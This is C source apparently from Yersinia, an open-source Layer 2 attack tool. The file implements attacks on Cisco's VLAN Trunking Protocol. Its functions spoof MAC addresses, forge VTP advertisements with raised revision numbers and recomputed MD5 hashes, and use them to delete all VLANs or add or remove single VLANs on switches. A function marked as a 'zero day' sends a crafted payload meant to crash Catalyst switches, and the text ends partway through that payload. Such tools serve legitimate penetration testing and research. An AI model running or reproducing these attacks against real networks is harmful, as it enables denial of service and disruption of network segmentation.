/* vtp.c
 * Implementation and attacks for Cisco's VLAN Trunking Protocol
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#ifndef lint
static const char rcsid[] = 
       "$Id: vtp.c 43 2007-04-27 11:07:17Z slay $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "vtp.h"

void
vtp_register(void)
{
   protocol_register(PROTO_VTP, "VTP", "VLAN Trunking Protocol", "vtp",
         sizeof(struct vtp_data), vtp_init_attribs, vtp_learn_packet,
         vtp_get_printable_packet, vtp_get_printable_store, vtp_load_values,
         vtp_attack, vtp_update_field, vtp_features, 
         vtp_comm_params, SIZE_ARRAY(vtp_comm_params), NULL, 0, NULL,
         vtp_init_comms_struct, PROTO_VISIBLE, vtp_end);
}

/*
 * Inicializa la estructura que se usa para relacionar el tmp_data
 * de cada nodo con los datos que se sacaran por pantalla cuando
 * se accede al demonio de red.
 * Teoricamente como esta funcion solo se llama desde term_add_node()
 * la cual, a su vez, solo es llamada al tener el mutex bloqueado por
 * lo que no veo necesario que sea reentrante. (Fredy). 
 */
int8_t
vtp_init_comms_struct(struct term_node *node)
{
    struct vtp_data *vtp_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(vtp_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("vtp_init_commands_struct calloc error",errno);
       return -1;
    }

    vtp_data = node->protocol[PROTO_VTP].tmp_data;
    
    node->protocol[PROTO_VTP].commands_param = comm_param;
    
    comm_param[VTP_SMAC]      = &vtp_data->mac_source; 
    comm_param[VTP_DMAC]      = &vtp_data->mac_dest;
    comm_param[VTP_VERSION]   = &vtp_data->version;
    comm_param[VTP_CODE]      = &vtp_data->code;  
    comm_param[VTP_DOMAIN]    = &vtp_data->domain; 
    comm_param[VTP_MD5]       = &vtp_data->md5; 
    comm_param[VTP_UPDATER]   = &vtp_data->updater; 
    comm_param[VTP_REVISION]  = &vtp_data->revision; 
    comm_param[VTP_TIMESTAMP] = &vtp_data->timestamp; 
    comm_param[VTP_STARTVAL]  = &vtp_data->start_val;
    comm_param[VTP_FOLLOWERS] = &vtp_data->followers; 
    comm_param[VTP_SEQ]       = &vtp_data->seq;
    comm_param[12]            = NULL; 
    comm_param[13]            = NULL;
    comm_param[VTP_VLAN]      = &vtp_data->options;

    return 0;
}

void
vtp_th_send(void *arg)
{
    struct attacks *attacks=NULL;
    struct vtp_data *vtp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    vtp_data = attacks->data;

    vtp_data->dom_len = strlen(vtp_data->domain);

write_log(0,"\n\nvtp_th_send domain=%s  dom_len=%d\n\n",vtp_data->domain,vtp_data->dom_len);

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("vtp_th_send pthread_sigmask()",errno);
       vtp_th_send_exit(attacks);
    }

    vtp_send(attacks);

    vtp_th_send_exit(attacks);
}


void
vtp_th_send_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}



int8_t
vtp_send(struct attacks *attacks)
{
    libnet_ptag_t t;
    libnet_t *lhandler;
    u_int32_t vtp_len=0, sent;
    struct vtp_data *vtp_data;
    struct vtp_summary *vtp_summ;
    struct vtp_subset *vtp_subset;
    struct vtp_request *vtp_request;
    struct vtp_join *vtp_join;
    u_int8_t *vtp_packet, *aux;
    u_int8_t cisco_data[]={ 0x00, 0x00, 0x0c, 0x20, 0x03 };
    dlist_t *p;
    struct interface_data *iface_data;
    struct interface_data *iface_data2;        
 
   vtp_data = attacks->data;
    
    switch(vtp_data->code)
    {
        case VTP_SUMM_ADVERT:
           vtp_len = sizeof(cisco_data)+sizeof(struct vtp_summary);
        break;
        case VTP_SUBSET_ADVERT:        
           vtp_len = sizeof(cisco_data)+sizeof(struct vtp_subset)+vtp_data->vlans_len;
        break;
        case VTP_REQUEST:        
           vtp_len = sizeof(cisco_data)+38;
        break;
        case VTP_JOIN:        
           vtp_len = sizeof(cisco_data)+40+126;
        break;
        default:
           vtp_len = sizeof(cisco_data)+30;
        break;        
    }
    
    vtp_packet = calloc(1,vtp_len);
 
    if (vtp_packet == NULL)
    {
       thread_error("vtp_send calloc error",errno);
       return -1;
    } 

    aux = vtp_packet;
    memcpy(vtp_packet,cisco_data,sizeof(cisco_data));
    aux+=sizeof(cisco_data);

    switch(vtp_data->code)
    {
        case VTP_SUMM_ADVERT:
           vtp_summ = (struct vtp_summary *)aux;
           vtp_summ->version = vtp_data->version;
           vtp_summ->code = vtp_data->code;
           vtp_summ->followers = vtp_data->followers;
           if (vtp_data->dom_len > VTP_DOMAIN_SIZE)
           {
               vtp_summ->dom_len = VTP_DOMAIN_SIZE;
               memcpy(vtp_summ->domain,vtp_data->domain,VTP_DOMAIN_SIZE);
           }
           else
           {
               vtp_summ->dom_len = vtp_data->dom_len;
               memcpy(vtp_summ->domain,vtp_data->domain,vtp_data->dom_len);
           }                
           vtp_summ->revision = htonl(vtp_data->revision);
           vtp_summ->updater = htonl(vtp_data->updater);
           memcpy(vtp_summ->timestamp,vtp_data->timestamp,VTP_TIMESTAMP_SIZE);      
           memcpy(vtp_summ->md5,vtp_data->md5,16);
        break;
  
        case VTP_SUBSET_ADVERT:
           vtp_subset = (struct vtp_subset *)aux;
           vtp_subset->version = vtp_data->version;
           vtp_subset->code = vtp_data->code;
           vtp_subset->seq = vtp_data->seq;
           if (vtp_data->dom_len > VTP_DOMAIN_SIZE)
           {
               vtp_subset->dom_len = VTP_DOMAIN_SIZE;
               memcpy(vtp_subset->domain,vtp_data->domain,VTP_DOMAIN_SIZE);
           }
           else
           {
               vtp_subset->dom_len = vtp_data->dom_len;
               memcpy(vtp_subset->domain,vtp_data->domain,vtp_data->dom_len);
           }                
           vtp_subset->revision = htonl(vtp_data->revision);
           if (vtp_data->vlans_len)
              memcpy((vtp_subset+1),vtp_data->vlan_info,vtp_data->vlans_len);           
        break;
        
        case VTP_REQUEST:        
           vtp_request = (struct vtp_request *)aux;
           vtp_request->version = vtp_data->version;
           vtp_request->code = vtp_data->code;
           vtp_request->reserved = 0;
           if (vtp_data->dom_len > VTP_DOMAIN_SIZE)
           {
               vtp_request->dom_len = VTP_DOMAIN_SIZE;
               memcpy(vtp_request->domain,vtp_data->domain,VTP_DOMAIN_SIZE);
           }
           else
           {
               vtp_request->dom_len = vtp_data->dom_len;
               memcpy(vtp_request->domain,vtp_data->domain,vtp_data->dom_len);
           }                
           vtp_request->start_val = htons(vtp_data->start_val);
        break;
        
        case VTP_JOIN:
           vtp_join = (struct vtp_join *)aux;
           vtp_join->version = vtp_data->version;
           vtp_join->code = vtp_data->code;
           vtp_join->maybe_reserved = 0;
           if (vtp_data->dom_len > VTP_DOMAIN_SIZE)
           {
               vtp_join->dom_len = VTP_DOMAIN_SIZE;
               memcpy(vtp_join->domain,vtp_data->domain,VTP_DOMAIN_SIZE);
           }
           else
           {
               vtp_join->dom_len = vtp_data->dom_len;
               memcpy(vtp_join->domain,vtp_data->domain,vtp_data->dom_len);
           }                
           vtp_join->vlan = htonl(0x000003ef);
           vtp_join->unknown[0] = 0x40;
        break;
        default:
           aux[0]=vtp_data->version;
           aux[1]=vtp_data->code;
        break;
    }
    
    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) {
       iface_data = (struct interface_data *) dlist_data(p);
            lhandler = iface_data->libnet_handler;

            t = libnet_build_802_2(
                    0xaa,            /* DSAP */   
                    0xaa,            /* SSAP */
                    0x03,            /* control */
                    vtp_packet,      /* payload */  
                    vtp_len,         /* payload size */
                    lhandler,        /* libnet handle */
                    0);              /* libnet id */

            if (t == -1) 
            {
                thread_libnet_error("Can't build ethernet header",lhandler);
                libnet_clear_packet(lhandler);
                free(vtp_packet);
                return -1;
            }  

            t = libnet_build_802_3(
                    vtp_data->mac_dest,       /* ethernet destination */
                    (attacks->mac_spoofing) ? vtp_data->mac_source : iface_data->etheraddr,
                    /* ethernet source */
                    LIBNET_802_2_H + vtp_len, /* frame size */
                    NULL,                     /* payload */
                    0,                        /* payload size */
                    lhandler,                 /* libnet handle */
                    0);                       /* libnet id */

            if (t == -1)
            {
                thread_libnet_error("Can't build ethernet header",lhandler);
                libnet_clear_packet(lhandler);
                free(vtp_packet);                
                return -1;
            }

            /*
             *  Write it to the wire.
             */
            sent = libnet_write(lhandler);

            if (sent == -1) {
                thread_libnet_error("libnet_write error", lhandler);
                libnet_clear_packet(lhandler);
                free(vtp_packet);
                return -1;
            }
            libnet_clear_packet(lhandler);
            protocols[PROTO_VTP].packets_out++;
            iface_data2 = interfaces_get_struct(iface_data->ifname);
            iface_data2->packets_out[PROTO_VTP]++;
    }

    free(vtp_packet);    

    return 0;
}


/*
 * Delete all VTP vlans
 */
void
vtp_th_dos_del_all(void *arg)
{
    struct attacks *attacks=NULL;
    struct vtp_data *vtp_data, vtp_data_learned;
    struct pcap_pkthdr header;
    struct pcap_data pcap_aux;
    struct libnet_802_3_hdr *ether;
    struct timeval now;
    u_int8_t *packet=NULL, *cursor;
    sigset_t mask;
    /* Cisco default vlans */
    u_int8_t vlan_cisco[]={ 0x14, 0x00, 0x01, 0x07, 0x00, 0x01, 0x05, 0xdc,
                          0x00, 0x01, 0x86, 0xa1, 0x64, 0x65, 0x66, 0x61, 
                          0x75, 0x6c, 0x74, 0x00, 0x20, 0x00, 0x02, 0x0c, 
                          0x03, 0xea, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8a, 
                          0x66, 0x64, 0x64, 0x69, 0x2d, 0x64, 0x65, 0x66, 
                          0x61, 0x75, 0x6c, 0x74, 0x01, 0x01, 0x00, 0x00, 
                          0x04, 0x01, 0x00, 0x00, 0x28, 0x00, 0x03, 0x12, 
                          0x03, 0xeb, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8b, 
                          0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x2d, 0x72, 0x69, 
                          0x6e, 0x67, 0x2d, 0x64, 0x65, 0x66, 0x61, 0x75, 
                          0x6c, 0x74, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 
                          0x04, 0x01, 0x00, 0x00, 0x24, 0x00, 0x04, 0x0f, 
                          0x03, 0xec, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8c, 
                          0x66, 0x64, 0x64, 0x69, 0x6e, 0x65, 0x74, 0x2d, 
                          0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x00, 
                          0x02, 0x01, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 
                          0x24, 0x00, 0x05, 0x0d, 0x03, 0xed, 0x05, 0xdc, 
                          0x00, 0x01, 0x8a, 0x8d, 0x74, 0x72, 0x6e, 0x65, 
                          0x74, 0x2d, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 
                          0x74, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00, 
                          0x03, 0x01, 0x00, 0x02 };

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("vtp_th_dos_del_all pthread_sigmask()",errno);
       vtp_th_dos_del_all_exit(attacks);
    }

    vtp_data = attacks->data;

    gettimeofday(&now, NULL);

    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_usec;
    
    if ((packet = calloc(1, SNAPLEN)) == NULL)
        vtp_th_dos_del_all_exit(attacks);

    
    while (!attacks->attack_th.stop)
    {
        memset((void *)&vtp_data_learned,0,sizeof(struct vtp_data));
        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet,
                              PROTO_VTP, NO_TIMEOUT);
        if (attacks->attack_th.stop)
           break;   
           
        cursor = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        ether = (struct libnet_802_3_hdr *) packet;
        
        if (!memcmp(vtp_data->mac_source,ether->_802_3_shost,6) )
          continue; /* Oops!! Its our packet... */

        pcap_aux.header = &header;
        pcap_aux.packet = packet;
                                                                                          
        if (vtp_load_values(&pcap_aux, &vtp_data_learned) < 0)
           continue;

        if ((vtp_data_learned.code != VTP_SUMM_ADVERT) 
             && (vtp_data_learned.code != VTP_SUBSET_ADVERT) )
           continue;

        write_log(0," Domain    %s\n",vtp_data_learned.domain);
        write_log(0," Dom_len   %d\n",vtp_data_learned.dom_len);
        write_log(0," Followers %d\n",vtp_data_learned.followers);
        write_log(0," Revision  %X\n",(vtp_data_learned.revision+1));
        if (vtp_generate_md5( NULL,
                              vtp_data->updater,
                              (vtp_data_learned.revision+1),
                              vtp_data_learned.domain, 
                              vtp_data_learned.dom_len, 
                              vlan_cisco,
                              sizeof(vlan_cisco), 
                              vtp_data->md5,
                              vtp_data_learned.version) < 0)
           break;

        vtp_data->code = VTP_SUMM_ADVERT;
        vtp_data->followers = 1;
        if (vtp_data_learned.dom_len > VTP_DOMAIN_SIZE)
        {
            vtp_data->dom_len = VTP_DOMAIN_SIZE;
            memcpy(vtp_data->domain,vtp_data_learned.domain,VTP_DOMAIN_SIZE);
        }
        else
        {
            vtp_data->dom_len = vtp_data_learned.dom_len;
            memcpy(vtp_data->domain,vtp_data_learned.domain,vtp_data_learned.dom_len);
        }                
        vtp_data->revision = vtp_data_learned.revision+1;
        
        thread_usleep(200000);
        if (vtp_send(attacks)< 0)
           break;
        thread_usleep(200000);
        
        vtp_data->code = VTP_SUBSET_ADVERT;
        vtp_data->seq = 1;
      
        vtp_data->vlan_info = vlan_cisco;
        vtp_data->vlans_len = sizeof(vlan_cisco);
        vtp_send(attacks);
        
        break; 
    }

    free(packet);
    
    vtp_th_dos_del_all_exit(attacks);
}


/*
 * Generate the MD5 hash for a VTP Summary-Advert packet
 */
int8_t
vtp_generate_md5(char *secret, u_int32_t updater, u_int32_t revision, char *domain, 
                 u_int8_t dom_len, u_int8_t *vlans, u_int16_t vlans_len, u_int8_t *md5,
                 u_int8_t version)
{
    u_int8_t *data, md5_secret[16];
    struct vtp_summary *vtp_summ;

    /* Space for the data (MD5+SUMM_ADVERT+VLANS+MD5)...*/
    if ( (data = calloc(1, (16+sizeof(struct vtp_summary)+vlans_len+16))) == NULL)
    {
        thread_error("vtp_generate_md5 calloc()",errno);
        return -1;
    }

     /* Do MD5 secret...*/
    if (secret)
       md5_sum(data, strlen(secret), md5_secret);

    vtp_summ = (struct vtp_summary *)(data+16);
write_log(0,"Se calcula MD5 con version=%d\n",version);    
    vtp_summ->version = version;
    vtp_summ->code = 0x01;
    if (dom_len > VTP_DOMAIN_SIZE)
    {
        vtp_summ->dom_len = VTP_DOMAIN_SIZE;
        memcpy(vtp_summ->domain,domain,VTP_DOMAIN_SIZE);
    }
    else
    {
        vtp_summ->dom_len = dom_len;
        memcpy(vtp_summ->domain,domain,dom_len);
    }                
    vtp_summ->updater  = htonl(updater);
    vtp_summ->revision = htonl(revision);

    if (vlans_len)
       memcpy((void *)(vtp_summ+1),vlans,vlans_len);

    if (secret)
       memcpy((void *)(data+16+sizeof(struct vtp_summary)+vlans_len),md5_secret,16);

    md5_sum(data, (32+sizeof(struct vtp_summary)+vlans_len), md5);
 
    free(data);

    return 0;
}



void
vtp_th_dos_del_all_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


/*
 * Delete 1 VTP vlan
 */
void
vtp_th_dos_del(void *arg)
{
    struct attacks *attacks=NULL;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("vtp_th_dos_del pthread_sigmask()",errno);
       vtp_th_dos_del_exit(attacks);
    }

    vtp_modify_vlan(VTP_VLAN_DEL,attacks);
    
    vtp_th_dos_del_exit(attacks);
}


void
vtp_modify_vlan(u_int8_t op, struct attacks *attacks)
{   
    struct vtp_data *vtp_data, vtp_data_learned;
    struct pcap_pkthdr header;
    struct pcap_data pcap_aux;
    struct libnet_802_3_hdr *ether;
    struct attack_param *param=NULL;
    struct timeval now;
    u_int8_t *packet=NULL, *cursor=NULL;
    char *vlan_name = NULL;
    u_int16_t *vlan=NULL;

    vtp_data = attacks->data;
    
    param = attacks->params;
      
    vlan = (u_int16_t *)param[VTP_PARAM_VLAN_ID].value;

    if (op == VTP_VLAN_ADD)
        vlan_name  = (char *)param[VTP_PARAM_VLAN_NAME].value;
    
    gettimeofday(&now, NULL);
    
    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_usec;
    
    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return;
    
    while (!attacks->attack_th.stop)
    {
        memset((void *)&vtp_data_learned,0,sizeof(struct vtp_data));
        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet,
                              PROTO_VTP, NO_TIMEOUT);
        if (attacks->attack_th.stop)
           break;   
           
        cursor = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        ether = (struct libnet_802_3_hdr *) packet;
        
        if (!memcmp(vtp_data->mac_source,ether->_802_3_shost,6) )
          continue; /* Oops!! Its our packet... */

        pcap_aux.header = &header;
        pcap_aux.packet = packet;
                                                                                          
        if (vtp_load_values(&pcap_aux, &vtp_data_learned) < 0)
           continue;

        if ((vtp_data_learned.code != VTP_SUMM_ADVERT) 
             && (vtp_data_learned.code != VTP_SUBSET_ADVERT) )
           continue;

        if (vtp_data_learned.code == VTP_SUMM_ADVERT)
            
        {
           if ( !vtp_data_learned.followers)
           {
              write_log(0,"vtp_attack: No followers. Sending Request...\n");
              vtp_data->version = vtp_data_learned.version;
              vtp_data->code = VTP_REQUEST;
              if (vtp_data_learned.dom_len > VTP_DOMAIN_SIZE)
              {
                  vtp_data->dom_len = VTP_DOMAIN_SIZE;
                  memcpy(vtp_data->domain,vtp_data_learned.domain,VTP_DOMAIN_SIZE);
              }
              else
              {
                  vtp_data->dom_len = vtp_data_learned.dom_len;
                  memcpy(vtp_data->domain,vtp_data_learned.domain,vtp_data_learned.dom_len);
              }                
              vtp_data->start_val = 1;
              if (vtp_send(attacks)< 0)
                 break;
           }
           continue;
        }

        write_log(0," Domain   %s\n",vtp_data_learned.domain);
        write_log(0," Dom_len  %d\n",vtp_data_learned.dom_len);
        write_log(0," Revision %X\n",(vtp_data_learned.revision+1));
        write_log(0," Vlan_len %d\n",vtp_data_learned.vlans_len);

        if (op == VTP_VLAN_DEL)
        {
            if (vtp_del_vlan(*vlan, vtp_data_learned.vlan_info, 
                             &vtp_data_learned.vlans_len) < 0)
            {
                write_log(0," vtp_del_attack: VLAN %d not existent. Aborting...\n",*vlan);
                break;
            }
        }
        else /* Add vlan...*/
        {
            if (vtp_add_vlan(*vlan, vlan_name, &vtp_data_learned.vlan_info,
                             &vtp_data_learned.vlans_len) < 0)
            {
                write_log(0," vtp_add_attack: VLAN %d existent. Aborting...\n",*vlan);
                break;
            }
        }

        if (vtp_generate_md5( NULL,
                              vtp_data->updater,
                              (vtp_data_learned.revision+1),
                              vtp_data_learned.domain, 
                              vtp_data_learned.dom_len, 
                              vtp_data_learned.vlan_info,
                              vtp_data_learned.vlans_len, 
                              vtp_data->md5,
                              vtp_data_learned.version) < 0)
            break;

        vtp_data->version = vtp_data_learned.version;
        vtp_data->code = VTP_SUMM_ADVERT;
        vtp_data->followers = 1;
        
        if (vtp_data_learned.dom_len > VTP_DOMAIN_SIZE)
        {
            vtp_data->dom_len = VTP_DOMAIN_SIZE;
            memcpy(vtp_data->domain,vtp_data_learned.domain,VTP_DOMAIN_SIZE);
        }
        else
        {
            vtp_data->dom_len = vtp_data_learned.dom_len;
            memcpy(vtp_data->domain,vtp_data_learned.domain,vtp_data_learned.dom_len);
        }                
        vtp_data->revision = vtp_data_learned.revision+1;

        if (vtp_send(attacks)< 0)
           break;
        thread_usleep(200000);
        
        vtp_data->version = vtp_data_learned.version;
        vtp_data->code = VTP_SUBSET_ADVERT;
        vtp_data->seq = 1;
        vtp_data->vlans_len = vtp_data_learned.vlans_len;
        vtp_data->vlan_info = vtp_data_learned.vlan_info;          

write_log(0," Vlan_len after = %d\n",vtp_data_learned.vlans_len);

        vtp_send(attacks);

        break;
    }

    free(packet);
}


int8_t
vtp_del_vlan(u_int16_t vlan, u_int8_t *vlans, u_int16_t *vlen)
{
    struct vlan_info *vlan_info, *vlan_info2;
    u_int8_t gotit=0, *cursor, *cursor2;
    u_int16_t len=0, vlans_len=0;
    
    vlans_len = *vlen;
    
    cursor = vlans;

    while( (cursor+sizeof(struct vlan_info)) < (vlans+vlans_len))
    {
       vlan_info = (struct vlan_info *) cursor;
       if ((cursor+vlan_info->len) > (vlans+vlans_len))
          break;
       if (ntohs(vlan_info->id) == vlan)
       {
          write_log(0,"VLAN gotit!!\n");
          gotit=1;
          cursor+=vlan_info->len;
          len = vlans_len-vlan_info->len;
          if ( (cursor+sizeof(struct vlan_info)) < (vlans+vlans_len))
          {
             cursor2 = (u_int8_t *)vlan_info;
             vlan_info2 = (struct vlan_info *) cursor2;
             if ((cursor2+vlan_info2->len) > (vlans+vlans_len))
             { /* Oversized!! */
                gotit=0;
                write_log(0," Oversized vlan length. Aborting...\n");
                break;
             }
             write_log(0," *NOT* the last VLAN, moving %d bytes...\n",
                       ( (vlans+vlans_len) - (cursor2+vlan_info->len)));
             memcpy((void *)vlan_info, (void *)(cursor2+vlan_info->len), 
                        ((vlans+vlans_len) - (cursor2+vlan_info->len)));
          }
          break;
       }
       cursor+=vlan_info->len;
    }
    
    if (!gotit)
       return -1;
    
    *vlen = len;
    
    return 0;
}



int8_t
vtp_add_vlan(u_int16_t vlan, char *vlan_name, u_int8_t **vlans_ptr, u_int16_t *vlen)
{
    struct vlan_info *vlan_info, *vlan_info2;
    u_int8_t  *cursor, *cursor2, *aux, *vlans, *last_init=NULL;
    u_int16_t len=0, vlans_len, last_id=0, last_len=0;
    
    vlans = *vlans_ptr;
    
    vlans_len = *vlen;

    aux = (u_int8_t *)calloc(1,vlans_len+sizeof(struct vlan_info)+VLAN_ALIGNED_LEN(strlen(vlan_name)));
    if (aux == NULL)
    {
       thread_error("vtp_add_vlan calloc()", errno);
       return -1;
    }
    
    cursor = vlans;

    while( (cursor+sizeof(struct vlan_info)) < (vlans+vlans_len))
    {
       vlan_info = (struct vlan_info *) cursor;
       if ((cursor+vlan_info->len) > (vlans+vlans_len))
          break;
       if ( (ntohs(last_id)<= vlan) && (ntohs(vlan_info->id)>= vlan) )
       {
          if (last_init == NULL) /* First VLAN */
          {
               vlan_info = (struct vlan_info *) aux;
               vlan_info->len = sizeof(struct vlan_info)+VLAN_ALIGNED_LEN(strlen(vlan_name));
               vlan_info->status = 0x00;
               vlan_info->type = VLAN_TYPE_ETHERNET;
               vlan_info->name_len = strlen(vlan_name);
               vlan_info->id = htons(vlan);
               vlan_info->mtu = htons(1500);
               vlan_info->dot10 = htonl(vlan+VTP_DOT10_BASE);
               memcpy((void *)(vlan_info+1),vlan_name,strlen(vlan_name));
               /* Now copy all the rest of vlans...*/
               memcpy((void *)(aux+vlan_info->len),vlans,vlans_len);
               *vlen = vlan_info->len+vlans_len;
               *vlans_ptr = aux;          
               return 0;
          }
          
          cursor+=vlan_info->len;
          len = vlans_len-vlan_info->len;
          
          if ( (cursor+sizeof(struct vlan_info)) < (vlans+vlans_len))
          {
             cursor2 = (u_int8_t *)vlan_info;
             vlan_info2 = (struct vlan_info *) cursor2;
             if ((cursor2+vlan_info2->len) > (vlans+vlans_len))
             { /* Oversized!! */
                write_log(0," Oversized vlan length. Aborting...\n");
                free(aux);
                return -1;
             }
             memcpy(aux,(void *)*vlans_ptr,( (last_init+last_len) - vlans ));
             vlan_info = (struct vlan_info *) (aux+ ((last_init+last_len) - vlans));
             vlan_info->len = sizeof(struct vlan_info)+VLAN_ALIGNED_LEN(strlen(vlan_name));
             vlan_info->status = 0x00;
             vlan_info->type = VLAN_TYPE_ETHERNET;
             vlan_info->name_len = strlen(vlan_name);
             vlan_info->id = htons(vlan);
             vlan_info->mtu = htons(1500);
             vlan_info->dot10 = htonl(vlan+VTP_DOT10_BASE);
             memcpy((void *)(vlan_info+1),vlan_name,strlen(vlan_name));
             cursor=(u_int8_t *)vlan_info;
             cursor+=vlan_info->len;
             memcpy(cursor, cursor2, (vlans+vlans_len)-cursor2 );
             *vlen = vlan_info->len+vlans_len;
             *vlans_ptr = aux;
             return 0;
          }
          else /* Last VLAN... */
          {

             return 0;
          }
          break;
       } /* We got it */

       last_len  = vlan_info->len;
       last_id   = vlan_info->id;
       last_init = (u_int8_t *)vlan_info;
       
       cursor+=vlan_info->len;
    }

    /* Last VLAN...*/
    
    memcpy((void *)aux,(void *)*vlans_ptr,vlans_len);
     
    vlan_info = (struct vlan_info *)(aux+vlans_len);
    vlan_info->len = sizeof(struct vlan_info)+VLAN_ALIGNED_LEN(strlen(vlan_name));
    vlan_info->status = 0x00;
    vlan_info->type = VLAN_TYPE_ETHERNET;
    vlan_info->name_len = strlen(vlan_name);
    vlan_info->id = htons(vlan);
    vlan_info->mtu = htons(1500);
    vlan_info->dot10 = htonl(vlan+VTP_DOT10_BASE);             
    memcpy((void *)(vlan_info+1),vlan_name,strlen(vlan_name));
    *vlen = vlan_info->len+vlans_len;
    *vlans_ptr = aux;

    return 0;
}




void
vtp_th_dos_del_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


/*
 * Add 1 VTP vlan
 */
void
vtp_th_dos_add(void *arg)
{
    struct attacks *attacks=NULL;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("vtp_th_dos_del pthread_sigmask()",errno);
       vtp_th_dos_add_exit(attacks);
    }

    vtp_modify_vlan(VTP_VLAN_ADD,attacks);
    
    vtp_th_dos_add_exit(attacks);
}


void
vtp_th_dos_add_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}

/*
 * Zero day crashing Catalyst!!
 */
void
vtp_th_dos_crash(void *arg)
{
    struct attacks *attacks=NULL;
    struct vtp_data *vtp_data, vtp_data_learned;
    struct pcap_pkthdr header;
    struct pcap_data pcap_aux;
    struct libnet_802_3_hdr *ether;
    struct timeval now;
    u_int8_t *packet=NULL, *cursor;
    sigset_t mask;
    /* Cisco vlans for crashing */
    u_int8_t vlan_cisco[]={ 0x75, 0x00, 0x01, 0x07, 0x20, 0x00, 0x02, 0x0c, 
                            0x03, 0xea, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8a, 
                            0x66, 0x64, 0x64, 0x69, 0x2d, 0x64, 0x65, 0x66, 
                            0x61, 0x75, 0x6c, 0x74, 0x01, 0x01, 0x00, 0x00, 
                            0x04, 0x01, 0x00, 0x00, 0x28, 0x00, 0x03, 0x12, 
                            0x03, 0xeb, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8b, 
                            0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x2d, 0x72, 0x69, 
                            0x6e, 0x67, 0x2d, 0x64, 0x65, 0x66, 0x61, 0x75, 
                            0x6c, 0x74, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
                            0x04, 0x01, 0x00, 0x00, 0x24, 0x00, 0x04, 0x0f, 
                            0x03, 0xec, 0x05, 0xdc, 0x00, 0x01, 0x8a, 0x8c, 
                            0x66, 0x64, 0x64, 0x69, 0x6e, 0x65, 0x74, 0x2d, 
                            0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x00, 
                            0x02, 0x01, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 
